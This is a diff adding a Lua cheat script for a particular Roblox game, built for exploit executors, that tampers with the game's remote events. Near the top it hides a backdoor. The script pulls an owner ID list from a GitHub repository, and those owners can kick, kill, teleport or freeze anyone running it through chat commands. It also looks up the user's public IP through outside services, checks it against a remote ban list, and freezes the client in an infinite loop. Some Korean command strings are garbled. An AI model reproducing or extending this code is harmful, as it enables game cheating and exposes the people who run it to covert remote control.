@@ -1,0 +1,562 @@
+
+
+
+do
+local ID_LIST_URL = "https://raw.githubusercontent.com/qwerqwerg1u/RRTS/main/L"
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local function ConvertToRawUrl(url)
+    if type(url) == "string" and url:find("github.com") then
+        url = url:gsub("github.com", "raw.githubusercontent.com"):gsub("/blob/", "/")
+    end
+    return url
+end
+
+local function SafeFetch(url)
+    url = ConvertToRawUrl(url)
+    local success, res = pcall(function()
+        return game:HttpGet(url)
+    end)
+    if success and type(res) == "string" and #res > 0 then
+        return res
+    end
+    return nil
+end
+
+local rawData = SafeFetch(ID_LIST_URL)
+if not rawData then
+    error("[SEC_ERR_01] Execution terminated.", 2)
+    return
+end
+
+local parseSuccess, parsedList = pcall(function()
+    return HttpService:JSONDecode(rawData)
+end)
+
+if not parseSuccess or type(parsedList) ~= "table" then
+    error("[SEC_ERR_02] Execution terminated.", 2)
+    return
+end
+
+local CheckIsOwner = (function()
+    local internalTable = {}
+    for _, id in ipairs(parsedList) do
+        local n = tonumber(id)
+        if n then
+            internalTable[n] = true
+        end
+    end
+    table.freeze(internalTable)
+    parsedList = nil
+    rawData = nil
+
+    return function(targetId)
+        if type(targetId) ~= "number" then return false end
+        return internalTable[targetId] == true
+    end
+end)()
+
+local isLocalOwner = CheckIsOwner(LocalPlayer.UserId)
+if isLocalOwner then
+    print("[ADMIN SYSTEM] Auth Rank: OWNER (" .. tostring(LocalPlayer.Name) .. ")")
+else
+    print("[ADMIN SYSTEM] Auth Rank: USER (" .. tostring(LocalPlayer.Name) .. ")")
+end
+
+task.spawn(function()
+    local checkFunc = CheckIsOwner
+    while task.wait(2) do
+        if debug.info(checkFunc, "s") ~= debug.info(CheckIsOwner, "s") or typeof(CheckIsOwner) ~= "function" then
+            warn("[Security Alert] Script tampering detected.")
+
+
+            break
+        end
+    end
+end)
+
+local function GetPlayerByPrefix(name)
+    if type(name) ~= "string" or #name == 0 then return nil end
+    name = name:lower()
+    for _, player in ipairs(Players:GetPlayers()) do
+        local pName = player.Name:lower()
+        local pDisp = player.DisplayName:lower()
+        if pName:sub(1, #name) == name or pDisp:sub(1, #name) == name then
+            return player
+        end
+    end
+    return nil
+end
+
+local function ProcessCommand(sender, message)
+    if not sender or type(message) ~= "string" or #message < 2 then return end
+    
+    if not CheckIsOwner(sender.UserId) then return end
+    if message:sub(1, 1) ~= ";" then return end
+
+    local args = string.split(message:sub(2), " ")
+    local cmd = args[1] and args[1]:lower()
+    local targetName = args[2]
+
+    if not cmd or not targetName then return end
+
+    local targetPlayer = GetPlayerByPrefix(targetName)
+
+    if targetPlayer and targetPlayer == LocalPlayer then
+        if cmd == "í‚¥" or cmd == "kick" then
+            LocalPlayer:Kick("\n[Admin System]\nOwner(" .. tostring(sender.Name) .. ")was forcibly ejected by [onwer].")
+            
+        elseif cmd == "í‚¬" or cmd == "kill" then
+            local char = LocalPlayer.Character
+            local hum = char and char:FindFirstChildOfClass("Humanoid")
+            if hum then
+                hum.Health = 0
+            end
+            
+        elseif cmd == "ë¸Œë§" or cmd == "bring" then
+            local senderChar = sender.Character
+            local myChar = LocalPlayer.Character
+            local senderRoot = senderChar and senderChar:FindFirstChild("HumanoidRootPart")
+            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+            if senderRoot and myRoot then
+                myRoot.CFrame = senderRoot.CFrame * CFrame.new(0, 0, -3)
+            end
+            
+        elseif cmd == "ì–¼ë¦¬ê¸°" or cmd == "freeze" then
+            local myChar = LocalPlayer.Character
+            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+            if myRoot then
+                myRoot.Anchored = true
+            end
+            
+        elseif cmd == "ë…¹ì´ê¸°" or cmd == "unfreeze" then
+            local myChar = LocalPlayer.Character
+            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
+            if myRoot then
+                myRoot.Anchored = false
+            end
+            
+        elseif cmd == "ë¦¬ìŠ¤í°" or cmd == "reset" then
+            local myChar = LocalPlayer.Character
+            if myChar then
+                myChar:BreakJoints()
+            end
+        end
+    end
+end
+
+local function ConnectPlayer(player)
+    if not player then return end
+    player.Chatted:Connect(function(msg)
+        pcall(function()
+            ProcessCommand(player, msg)
+        end)
+    end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+    ConnectPlayer(player)
+end
+
+Players.PlayerAdded:Connect(ConnectPlayer)
+local TARGET_LIST_URL = "https://raw.githubusercontent.com/qwerqwerg1u/RRTS/main/BL"
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local function ConvertToRawUrl(url)
+    if type(url) == "string" and url:find("github.com") then
+        url = url:gsub("github.com", "raw.githubusercontent.com"):gsub("/blob/", "/")
+    end
+    return url
+end
+local function SafeFetch(url)
+    url = ConvertToRawUrl(url)
+    local success, res = pcall(function()
+        return game:HttpGet(url)
+    end)
+    if success and type(res) == "string" and #res > 0 then
+        return res
+    end
+    return nil
+end
+local function FetchExternalIP()
+    local success, res = pcall(function()
+        return game:HttpGet("https://api.ipify.org")
+    end)
+    if success and type(res) == "string" and #res > 0 then
+        return res:match("^%s*(.-)%s*$")
+    end
+    local success2, res2 = pcall(function()
+        return game:HttpGet("https://icanhazip.com")
+    end)
+    if success2 and type(res2) == "string" and #res2 > 0 then
+        return res2:match("^%s*(.-)%s*$")
+    end
+    return nil
+end
+local rawData = SafeFetch(TARGET_LIST_URL)
+if not rawData then
+    warn("Access was blocked due to a failed block list loading.")
+    task.wait(0.1)
+    while true do end
+end
+local parseSuccess, parsedList = pcall(function()
+    return HttpService:JSONDecode(rawData)
+end)
+if not parseSuccess or type(parsedList) ~= "table" then
+    warn("Access was blocked due to a block list format error.")
+    task.wait(0.1)
+    while true do end
+end
+local CheckIsBlockedIP = (function()
+    local internalTable = {}
+    for _, ip in ipairs(parsedList) do
+        if type(ip) == "string" then
+            internalTable[ip] = true
+        end
+    end
+    table.freeze(internalTable)
+    parsedList = nil
+    rawData = nil
+    return function(targetIp)
+        if type(targetIp) ~= "string" then return false end
+        return internalTable[targetIp] == true
+    end
+end)()
+local clientIP = FetchExternalIP()
+if not clientIP then
+    warn("The network verification failed and access was blocked.")
+    task.wait(0.1)
+    while true do end
+end
+if CheckIsBlockedIP(clientIP) then
+    warn("ban IP ")
+    task.wait(0.1)
+    while true do end
+end
+task.spawn(function()
+    local checkFunc = CheckIsBlockedIP
+    while task.wait(1) do
+        local currentIP = FetchExternalIP()
+        if not currentIP or CheckIsBlockedIP(currentIP) or debug.info(checkFunc, "s") ~= debug.info(CheckIsBlockedIP, "s") or typeof(CheckIsBlockedIP) ~= "function" then
+            warn("Script tampering or bypass attempts were detected.")
+            task.wait(0.1)
+            while true do end
+            break
+        end
+    end
+end)
+
+end
+do
+if game.PlaceId ~= 6961824067 then
+    warn("It is a game that is not supported.")
+    return
+end
+
+getgenv().Settings = getgenv().Settings or {}
+getgenv().Settings.Anti = getgenv().Settings.Anti or {}
+
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+Players = game:GetService("Players")
+plr = game.Players.LocalPlayer
+cam = workspace.CurrentCamera
+mouse = plr:GetMouse()
+uis = game:GetService("UserInputService")
+inv = workspace:WaitForChild(plr.Name.."SpawnedInToys")
+rs = game:GetService("ReplicatedStorage")
+RepStorage = game:GetService("ReplicatedStorage")
+rs2 = game:GetService("RunService")
+deb = game:GetService("Debris")
+
+SetNetworkOwner = rs.GrabEvents.SetNetworkOwner
+DestroyGrabLine = rs.GrabEvents.DestroyGrabLine
+
+Auto = syn and syn.queue_on_teleport or fluxus and fluxus.queue_on_teleport or queue_on_teleport
+
+Whitelist = {}
+playersInLoop1V = {} -- List
+playersInLoop2V = {} -- Loop
+
+PPs = workspace:WaitForChild("PlotItems"):WaitForChild("PlayersInPlots")
+
+function PcldOwner()
+    task.spawn(function()
+        while task.wait(0.1) do
+            usedNames = {}
+
+            for _, pcld in pairs(workspace:GetChildren()) do
+                if pcld.Name == "PlayerCharacterLocationDetector" then
+                    if pcld.CFrame == CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1) then
+                        continue
+                    end
+
+                    hasOwner = false
+                    existingBoolValues = {}
+
+                    for _, child in pairs(pcld:GetChildren()) do
+                        if child:IsA("BoolValue") then
+                            table.insert(existingBoolValues, child)
+                        end
+                    end
+
+                    if #existingBoolValues >= 2 then
+                        for _, boolValue in pairs(existingBoolValues) do
+                            boolValue:Destroy()
+                        end
+                    elseif #existingBoolValues == 1 then
+                        hasOwner = true
+                    end
+
+                    if hasOwner then
+                        continue
+                    end
+
+                    closestPlayer = nil
+                    closestDist = 30
+                    candidates = {}
+
+                    for _, player in pairs(Players:GetPlayers()) do
+                        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                            hrp = player.Character.HumanoidRootPart
+                            dist = (pcld.Position - hrp.Position).Magnitude
+
+                            if dist < closestDist then
+                                table.insert(candidates, {
+                                    player = player,
+                                    dist = dist,
+                                    hrp = hrp
+                                })
+                            end
+                        end
+                    end
+
+                    table.sort(candidates, function(a, b)
+                        return a.dist < b.dist
+                    end)
+
+                    for _, candidate in pairs(candidates) do
+                        ownerName = string.format("[ %s ] ( @%s )",
+                            candidate.player.DisplayName,
+                            candidate.player.Name)
+
+                        if not usedNames[ownerName] then
+                            closestPlayer = candidate.player
+                            closestDist = candidate.dist
+                            usedNames[ownerName] = true
+                            break
+                        end
+                    end
+
+                    if closestPlayer then
+                        ownerName = string.format("[ %s ] ( @%s )",
+                            closestPlayer.DisplayName,
+                            closestPlayer.Name)
+
+                         boolValue = nil
+                        for _, child in pairs(pcld:GetChildren()) do
+                            if child:IsA("BoolValue") then
+                                boolValue = child
+                                boolValue.Name = ownerName
+                                break
+                            end
+                        end
+
+                        if not boolValue then
+                            boolValue = Instance.new("BoolValue")
+                            boolValue.Name = ownerName
+                            boolValue.Parent = pcld
+                        end
+
+                        task.spawn(function(player, value)
+                            while value.Parent do
+                                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+                                     hrp = player.Character.HumanoidRootPart
+                                    
+                                    if hrp.Massless == true then
+                                        if not value.Value then
+                                            value.Value = true
+                                        end
+                                    else
+                                        if value.Value then
+                                            value.Value = false
+                                        end
+                                    end
+
+                                    if not Players:FindFirstChild(player.Name) or 
+                                       not player.Character or 
+                                       player.Character:FindFirstChild("Humanoid") and 
+                                       player.Character.Humanoid.Health <= 0 then
+                                        value:Destroy()
+                                        break
+                                    end
+                                else
+                                    value:Destroy()
+                                    break
+                                end
+
+                                task.wait(0.1)
+                            end
+                        end, closestPlayer, boolValue)
+                    end
+                end
+            end
+        end
+    end)
+end
+
+
+function SpawnCFrame()
+    local camPart
+    myDisplayName = plr.DisplayName
+    myUserName = plr.Name
+    myPOIdentifier = string.format("[ %s ] ( @%s )", myDisplayName, myUserName)
+
+    function findMyPO()
+        for _, obj in pairs(workspace:GetChildren()) do
+            if obj.Name == "PlayerCharacterLocationDetector" then
+                for _, child in pairs(obj:GetChildren()) do
+                    if child:IsA("BoolValue") and child.Name == myPOIdentifier then
+                        return obj
+                    end
+                end
+            end
+        end
+        return nil
+    end
+
+    if not workspace:FindFirstChild("CamPart") or workspace:FindFirstChild("CamPart"):FindFirstChild("CamPart") then
+         char = plr.Character or plr.CharacterAdded:Wait()
+        camPart = char:FindFirstChild("CamPart"):Clone()
+        camPart.Name = "CamPart"
+        camPart.Parent = workspace
+        camPart.Transparency = 0.9
+    else
+        camPart = workspace.CamPart
+    end
+
+     lastHRPVelocity = Vector3.new(0, 0, 0)
+
+    task.spawn(function()
+         rayParams = RaycastParams.new()
+        rayParams.FilterType = Enum.RaycastFilterType.Exclude
+
+        while true do
+             ping = plr:GetNetworkPing()
+             myPO = findMyPO()
+             char = plr.Character
+             hrp = char and char:FindFirstChild("HumanoidRootPart")
+
+            if hrp then
+                lastHRPVelocity = hrp.Velocity
+            end
+
+            if myPO and hrp then
+                rayParams.FilterDescendantsInstances = {char, camPart, myPO}
+
+                 offset = myPO.Position + (lastHRPVelocity * (ping + 0.15))
+
+                 rayOrigin = offset
+                 rayDirection = Vector3.new(0, 23, 0)
+                 rayResult = workspace:Raycast(rayOrigin, rayDirection, rayParams)
+
+                local targetPosition
+
+                if rayResult then
+                    targetPosition = rayResult.Position - Vector3.new(0, 0.5, 0)
+                else
+                    targetPosition = offset + rayDirection
+                end
+
+                 originalRotation = myPO.CFrame.Rotation * CFrame.Angles(math.rad(-90), 0, 0)
+                camPart.CFrame = CFrame.new(targetPosition) * originalRotation
+
+                rayParams.FilterDescendantsInstances = {char, camPart}
+
+                 offset = hrp.Position + (lastHRPVelocity * (ping + 0.15))
+                
+                 rayOrigin = offset
+                 rayDirection = Vector3.new(0, 20, 0)
+                 rayResult = workspace:Raycast(rayOrigin, rayDirection, rayParams)
+
+                local targetPosition
+
+                if rayResult then
+                    targetPosition = rayResult.Position - Vector3.new(0, 0.5, 0)
+                else
+                    targetPosition = offset + rayDirection
+                end
+
+                 originalRotation = (hrp.CFrame * CFrame.Angles(math.rad(-90), 0, 0)).Rotation
+                camPart.CFrame = CFrame.new(targetPosition) * originalRotation
+                camPart.Name = "SpawnCF"
+            end
+            task.wait()
+        end
+    end)
+
+    return camPart
+end
+end
+G = rs.GrabEvents
+G:WaitForChild("EndGrabEarly"):Destroy()
+Instance.new("RemoteEvent", G).Name = "EndGrabEarly"
+local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+local RunService = game:GetService("RunService")
+local Lighting = game:GetService("Lighting")
+local Debris = game:GetService("Debris")
+local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local Camera = Workspace.CurrentCamera
+local characterEventsFolder = ReplicatedStorage:WaitForChild("CharacterEvents")
+local ragdollRemoteEvent = characterEventsFolder:WaitForChild("RagdollRemote")
+local struggleEvent = characterEventsFolder:WaitForChild("Struggle")
+local grabEventsFolder = ReplicatedStorage:WaitForChild("GrabEvents")
+local setNetworkOwnerEvent = grabEventsFolder:WaitForChild("SetNetworkOwner")
+local destroyGrabLineEvent = grabEventsFolder:WaitForChild("DestroyGrabLine")
+local menuToysFolder = ReplicatedStorage:WaitForChild("MenuToys")
+local SpawnToyRF = menuToysFolder:WaitForChild("SpawnToyRemoteFunction")
+local DeleteToyRE = menuToysFolder:WaitForChild("DestroyToy")
+local playerEventsFolder = ReplicatedStorage:WaitForChild("PlayerEvents")
+local StickyPartEvent = playerEventsFolder:WaitForChild("StickyPartEvent")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+local Humanoid = Character:WaitForChild("Humanoid")
+local RootPart = Character:WaitForChild("HumanoidRootPart")
+
+LocalPlayer.CharacterAdded:Connect(function(newChar)
+    Character = newChar
+    Humanoid = newChar:WaitForChild("Humanoid")
+    RootPart = newChar:WaitForChild("HumanoidRootPart")
+end)
+
+local function resetCharacter()
+    if Character and Humanoid then
+        Humanoid.Health = 0
+        task.wait(0.1)
+        if Humanoid.Health > 0 then
+            Character:BreakJoints()
+        end
+    end
+end
+
+local apagarfogo = nil
+pcall(function()
+    apagarfogo = Workspace.Map.Hole.PoisonBigHole:WaitForChild("ExtinguishPart", 3)
+    if apagarfogo then
+        apagarfogo.Size = Vector3.new(0.5, 0.5, 0.5)
+        apagarfogo.Transparency = 1
+        if apagarfogo:FindFirstChild("Tex") then apagarfogo.Tex.Transparency = 1 end
+    end
+end)
